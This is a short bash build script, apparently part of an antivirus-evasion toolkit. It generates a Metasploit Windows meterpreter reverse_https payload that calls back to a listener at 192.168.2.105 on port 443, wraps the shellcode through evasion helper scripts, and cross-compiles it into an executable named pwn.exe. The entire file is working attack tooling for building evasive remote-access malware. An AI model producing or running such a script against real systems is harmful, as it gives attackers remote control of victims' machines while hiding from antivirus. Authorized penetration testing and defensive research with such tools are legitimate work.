#!/bin/bash          

# very simple script for building the .exe file

msfpayload windows/meterpreter/reverse_https lhost=192.168.2.105 lport=443 C > sc.txt
./format.sh sc.txt > scclean.txt
./make_avet -f scclean.txt

wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o pwn.exe avet.c

rm sc.txt

# comment the following line when you use make_avet with -u
rm scclean.txt

echo "" > defs.h